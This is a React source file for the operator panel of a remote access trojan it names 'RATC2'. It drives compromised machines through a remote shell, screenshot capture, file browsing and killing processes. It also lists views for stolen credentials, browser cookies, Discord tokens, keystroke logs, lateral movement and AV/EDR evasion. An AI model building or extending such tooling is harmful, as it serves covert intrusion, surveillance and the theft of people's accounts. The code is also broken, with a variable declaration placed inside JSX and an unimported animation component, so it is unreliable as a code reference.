import * as React from "react"
import { useAgentStore } from '@/stores/agentStore'
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { Textarea } from '@/components/ui/Textarea'
import { ScrollArea } from '@/components/ui/ScrollArea'
import { cn } from '@/lib/utils'
import {
  Terminal,
  Camera,
  Download,
  Upload,
  Network,
  Shield,
  Bug,
  Settings,
  Shield as ShieldIcon,
  AlertTriangle,
  MoreVertical,
  SquarePen,
  Send,
  Trash2,
  RefreshCw,
  Play,
  Pause,
  Power,
  Copy,
  Search,
  Filter,
  ChevronUp,
  ChevronDown,
  Minimize2,
  Maximize2,
  Split,
  X,
  Loader2,
  Image,
  FileText,
  Folder,
  File,
  Clock,
  Zap,
  Crown,
  User,
  Globe,
  Cpu,
  Database,
  Server,
  Wifi,
  WifiOff,
} from "lucide-react"
import { formatDistanceToNow } from 'date-fns'

interface AgentDetailContentProps {
  agentId: string
  mode: 'shell' | 'screenshot' | 'files' | 'processes' | 'lateral' | 'evasion' | 'modules' | 'credentials' | 'cookies' | 'discord' | 'keystrokes'
}

export function AgentDetailContent({ agentId, mode }: AgentDetailContentProps) {
  const { 
    tasks, 
    fileTransfers, 
    credentials, 
    cookies, 
    discordTokens, 
    keystrokes, 
    screenshots, 
    processes, 
    lateralMoves, 
    evasionResults, 
    modules,
    executeShell,
    takeScreenshot,
    suspendProcess,
    resumeProcess,
    killProcess,
    fetchTasks,
    fetchFileTransfers,
    fetchCredentials,
    fetchCookies,
    fetchDiscordTokens,
    fetchKeystrokes,
    fetchScreenshots,
    fetchProcesses,
    fetchLateralMoves,
    fetchEvasionResults,
    fetchModules,
  } = useAgentStore()

  const [command, setCommand] = React.useState('')
  const [commandHistory, setCommandHistory] = React.useState<string[]>([])
  const [historyIndex, setHistoryIndex] = React.useState(-1)
  const [output, setOutput] = React.useState<string>('')
  const [isExecuting, setIsExecuting] = React.useState(false)
  const [splitView, setSplitView] = React.useState(false)
  const [selectedScreenshot, setSelectedScreenshot] = React.useState<string | null>(null)
  const [filePath, setFilePath] = React.useState('/')
  const [searchTerm, setSearchTerm] = React.useState('')

  // Fetch data based on mode
  React.useEffect(() => {
    switch (mode) {
      case 'shell':
        fetchTasks(agentId)
        break
      case 'screenshot':
        fetchScreenshots(agentId)
        break
      case 'files':
        fetchFileTransfers(agentId)
        break
      case 'processes':
        fetchProcesses(agentId)
        break
      case 'lateral':
        fetchLateralMoves(agentId)
        break
      case 'evasion':
        fetchEvasionResults(agentId)
        break
      case 'modules':
        fetchModules(agentId)
        break
      case 'credentials':
        fetchCredentials(agentId)
        break
      case 'cookies':
        fetchCookies(agentId)
        break
      case 'discord':
        fetchDiscordTokens(agentId)
        break
      case 'keystrokes':
        fetchKeystrokes(agentId)
        break
    }
  }, [mode, agentId])

  const handleCommandSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!command.trim() || isExecuting) return
    
    setIsExecuting(true)
    setCommandHistory(prev => [command, ...prev].slice(0, 100))
    setHistoryIndex(-1)
    
    try {
      const task = await executeShell(agentId, command)
      setOutput(prev => prev + `\n$ ${command}\n${task.Output || 'Executing...'}\n`)
    } catch (error) {
      setOutput(prev => prev + `\n$ ${command}\nError: ${error instanceof Error ? error.message : 'Failed'}\n`)
    } finally {
      setIsExecuting(false)
      setCommand('')
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (historyIndex < commandHistory.length - 1) {
        setHistoryIndex(prev => prev + 1)
        setCommand(commandHistory[historyIndex + 1])
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (historyIndex > 0) {
        setHistoryIndex(prev => prev - 1)
        setCommand(commandHistory[historyIndex - 1])
      } else if (historyIndex === 0) {
        setHistoryIndex(-1)
        setCommand('')
      }
    }
  }

  const renderShell = () => (
    <div className="h-full flex flex-col">
      {/* Terminal Output */}
      <ScrollArea className="flex-1 bg-dark-950 rounded-lg border border-dark-700 p-4 font-mono text-sm" style={{ fontFamily: 'JetBrains Mono, Fira Code, monospace' }}>
        <div className="text-green-400 mb-2">
          RATC2 Agent Shell - Connected to {agentId.slice(0, 8)}...
        </div>
        <div className="text-dark-400 mb-4">
          Type 'help' for available commands. Use ↑/↓ for history.
        </div>
        <pre className="whitespace-pre-wrap word-break-all text-dark-100">{output || 'Waiting for commands...'}</pre>
      </ScrollArea>
      
      {/* Command Input */}
      <div className="flex items-center gap-3 mt-4 p-3 bg-dark-900/50 rounded-lg border border-dark-700">
        <span className="text-green-400 font-mono">$</span>
        <form onSubmit={handleCommandSubmit} className="flex-1">
          <Input
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Enter command..."
            className="bg-transparent border-none focus-visible:ring-0 focus-visible:ring-offset-0 text-dark-100 placeholder-dark-500"
            disabled={isExecuting}
          />
        </form>
        <Button type="submit" onClick={handleCommandSubmit} disabled={isExecuting || !command.trim()} size="sm">
          <Send className="w-4 h-4" />
        </Button>
        <Button variant="outline" size="sm" onClick={() => setSplitView(!splitView)} className="ml-2">
          <Split className="w-4 h-4" />
        </Button>
      </div>

      {/* Screenshot Preview in Split View */}
      {splitView && selectedScreenshot && (
        <div className="mt-4 relative">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-medium text-dark-300">Screenshot Preview</span>
            <Button variant="ghost" size="icon" onClick={() => setSplitView(false)}>
              <X className="w-4 h-4" />
            </Button>
          </div>
          <div className="relative bg-dark-950 rounded-lg border border-dark-700 overflow-hidden">
            <img 
              src={`data:image/png;base64,${selectedScreenshot}`} 
              alt="Screenshot" 
              className="w-full h-[300px] object-contain"
            />
          </div>
        </div>
      )}
    </div>
  )

  const renderScreenshots = () => (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Camera className="w-5 h-5 text-accent-400" />
          Screenshots
        </CardTitle>
        <div className="flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={() => takeScreenshot(agentId)}>
            <Camera className="w-4 h-4 mr-2" />
            Take Screenshot
          </Button>
          <Button variant="outline" size="sm" onClick={() => fetchScreenshots(agentId)}>
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>
      
      {screenshots.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <Camera className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">No screenshots yet</h3>
            <p className="text-dark-500 mb-4">Take a screenshot to get started</p>
            <Button onClick={() => takeScreenshot(agentId)} size="lg">
              <Camera className="w-4 h-4 mr-2" />
              Take Screenshot
            </Button>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {screenshots.map((screenshot) => (
              <motion.div
                key={screenshot.ID}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="group relative bg-dark-900/50 rounded-lg border border-dark-700 overflow-hidden cursor-pointer transition-all hover:border-accent-500/30"
                onClick={() => setSelectedScreenshot(screenshot.Data)}
              >
                <div className="aspect-video relative overflow-hidden">
                  <img 
                    src={`data:image/png;base64,${screenshot.Data}`} 
                    alt={`Screenshot ${screenshot.ID.slice(0, 8)}`}
                    className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
                  />
                  <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                    <div className="absolute bottom-3 left-3 right-3 flex justify-between">
                      <span className="text-xs text-dark-300 bg-dark-900/80 px-2 py-1 rounded">
                        {formatDistanceToNow(new Date(screenshot.Timestamp), { addSuffix: true })}
                      </span>
                      <Button variant="ghost" size="icon" className="text-accent-400">
                        <Maximize2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                </div>
                <div className="p-3 border-t border-dark-700">
                  <p className="text-xs text-dark-400 font-mono truncate">{screenshot.ID}</p>
                  <p className="text-xs text-dark-500">{screenshot.Width}x{screenshot.Height}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </ScrollArea>
      )}
    </div>
  )

  const renderFiles = () => (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Folder className="w-5 h-5 text-accent-400" />
          File Browser
        </CardTitle>
        <div className="flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={() => fetchFileTransfers(agentId)}>
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>
      
      {/* Path Navigation */}
      <div className="flex items-center gap-2 mb-4 p-3 bg-dark-900/50 rounded-lg border border-dark-700">
        <Folder className="w-4 h-4 text-dark-400" />
        <Input
          value={filePath}
          onChange={(e) => setFilePath(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && fetchFileTransfers(agentId)}
          placeholder="Enter path..."
          className="bg-transparent border-none focus-visible:ring-0 focus-visible:ring-offset-0 flex-1 text-dark-100 placeholder-dark-500"
        />
        <Button variant="outline" size="sm" onClick={() => fetchFileTransfers(agentId)}>
          <RefreshCw className="w-4 h-4" />
        </Button>
      </div>

      {fileTransfers.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <FileText className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">No files found</h3>
            <p className="text-dark-500 mb-4">Navigate to a directory or upload files</p>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="space-y-1">
            {fileTransfers.map((file) => (
              <motion.div
                key={file.ID}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                className="flex items-center gap-3 p-3 bg-dark-900/50 rounded-lg border border-dark-700 hover:border-accent-500/30 transition-all group"
              >
                <div className={cn("p-2 rounded-lg", file.Type === 'download' ? 'bg-blue-500/10' : 'bg-green-500/10')}>
                  {file.Type === 'download' ? (
                    <Download className="w-5 h-5 text-blue-400" />
                  ) : (
                    <File className="w-5 h-5 text-green-400" />
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <p className="font-medium text-dark-100 truncate">{file.Path.split('/').pop() || file.Path}</p>
                  <p className="text-xs text-dark-400 font-mono truncate">{file.Path}</p>
                </div>
                <div className="flex items-center gap-2 text-xs text-dark-500">
                  <span className="font-mono">{(file.Size / 1024).toFixed(1)} KB</span>
                  <span className={cn(
                    "px-2 py-0.5 rounded-full text-xs font-medium",
                    file.Status === 'completed' ? 'bg-green-500/20 text-green-400' :
                    file.Status === 'in_progress' ? 'bg-yellow-500/20 text-yellow-400' :
                    'bg-red-500/20 text-red-400'
                  )}>
                    {file.Status}
                  </span>
                </div>
                <div className="flex items-center gap-1">
                  <Button variant="ghost" size="icon" className="h-8 w-8 text-dark-400 hover:text-accent-400">
                    <Download className="w-4 h-4" />
                  </Button>
                  <Button variant="ghost" size="icon" className="h-8 w-8 text-dark-400 hover:text-red-400">
                    <Trash2 className="w-4 h-4" />
                  </Button>
                </div>
              </motion.div>
            ))}
          </div>
        </ScrollArea>
      )}
    </div>
  )

  const renderProcesses = () => (
    <div className="h-full flex flex-col">
      <div className="flex items-center justify-between mb-4">
        <CardTitle className="flex items-center gap-2">
          <Network className="w-5 h-5 text-accent-400" />
          Processes
        </CardTitle>
        <div className="flex items-center gap-2">
          <Input
            placeholder="Search processes..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-64"
          />
          <Button variant="outline" size="sm" onClick={() => fetchProcesses(agentId)}>
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>

      const filteredProcesses = processes.filter(p => 
        p.Name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        p.PID.toString().includes(searchTerm) ||
        p.User.toLowerCase().includes(searchTerm.toLowerCase())
      )

      {filteredProcesses.length === 0 ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="card-hover text-center p-8">
            <Network className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-300 mb-1">No processes found</h3>
            <p className="text-dark-500 mb-4">Refresh to load process list</p>
          </Card>
        </div>
      ) : (
        <ScrollArea className="flex-1">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-dark-400 border-b border-dark-700">
                  <th className="pb-3 font-mono">PID</th>
                  <th className="pb-3">Name</th>
                  <th className="pb-3 font-mono">PPID</th>
                  <th className="pb-3">User</th>
                  <th className="pb-3 font-mono">CPU %</th>
                  <th className="pb-3 font-mono">Memory</th>
                  <th className="pb-3">Status</th>
                  <th className="pb-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {filteredProcesses.map((proc) => (
                  <tr key={proc.PID} className="border-b border-dark-800 hover:bg-dark-800/50 transition-colors">
                    <td className="py-3 font-mono text-dark-300">{proc.PID}</td>
                    <td className="py-3 text-dark-100 truncate max-w-[200px]">{proc.Name}</td>
                    <td className="py-3 font-mono text-dark-400">{proc.PPID}</td>
                    <td className="py-3 text-dark-400">{proc.User}</td>
                    <td className="py-3 font-mono text-dark-400">{proc.CPU.toFixed(1)}%</td>
                    <td className="py-3 font-mono text-dark-400">{(proc.Memory / 1024 / 1024).toFixed(1)} MB</td>
                    <td className="py-3">
                      <span className={cn(
                        "px-2 py-0.5 rounded-full text-xs font-medium",
                        proc.Status === 'running' ? 'bg-green-500/20 text-green-400' :
                        'bg-yellow-500/20 text-yellow-400'
                      )}>
                        {proc.Status}
                      </span>
                    </td>
                    <td className="py-3">
                      <div className="flex items-center gap-1">
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-yellow-400 hover:bg-yellow-500/10" onClick={() => suspendProcess(agentId, proc.PID)} title="Suspend">
                          <Pause className="w-4 h-4" />
                        </Button>
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-green-400 hover:bg-green-500/10" onClick={() => resumeProcess(agentId, proc.PID)} title="Resume">
                          <Play className="w-4 h-4" />
                        </Button>
                        <Button variant="ghost" size="icon" className="h-8 w-8 text-red-400 hover:bg-red-500/10" onClick={() => killProcess(agentId, proc.PID)} title="Kill">
                          <Power className="w-4 h-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </ScrollArea>
      )}
    </div>
  )

  const renderPlaceholder = (title: string, icon: React.ReactNode, description: string) => (
    <div className="h-full flex items-center justify-center">
      <Card className="card-hover text-center p-8 max-w-md">
        <div className="text-accent-400 mb-4">{icon}</div>
        <h3 className="text-lg font-medium text-dark-300 mb-1">{title}</h3>
        <p className="text-dark-500 mb-4">{description}</p>
        <Button variant="outline" size="sm">
          <RefreshCw className="w-4 h-4 mr-2" />
          Refresh
        </Button>
      </Card>
    </div>
  )

  const renderContent = () => {
    switch (mode) {
      case 'shell':
        return renderShell()
      case 'screenshot':
        return renderScreenshots()
      case 'files':
        return renderFiles()
      case 'processes':
        return renderProcesses()
      case 'lateral':
        return renderPlaceholder('Lateral Movement', <Bug className="w-16 h-16" />, 'Network pivoting and scanning capabilities')
      case 'evasion':
        return renderPlaceholder('Evasion Techniques', <Shield className="w-16 h-16" />, 'AV/EDR bypass methods and results')
      case 'modules':
        return renderPlaceholder('Modules', <Settings className="w-16 h-16" />, 'Load/unload capability modules')
      case 'credentials':
        return renderPlaceholder('Credentials', <ShieldIcon className="w-16 h-16" />, 'Extracted browser and system credentials')
      case 'cookies':
        return renderPlaceholder('Cookies', <AlertTriangle className="w-16 h-16" />, 'Browser session cookies')
      case 'discord':
        return renderPlaceholder('Discord Tokens', <MoreVertical className="w-16 h-16" />, 'Discord authentication tokens')
      case 'keystrokes':
        return renderPlaceholder('Keystrokes', <SquarePen className="w-16 h-16" />, 'Captured keystroke logs')
      default:
        return renderPlaceholder('Unknown', <Terminal className="w-16 h-16" />, 'Unknown mode')
    }
  }

  return (
    <div className="h-full">
      {renderContent()}
    </div>
  )
}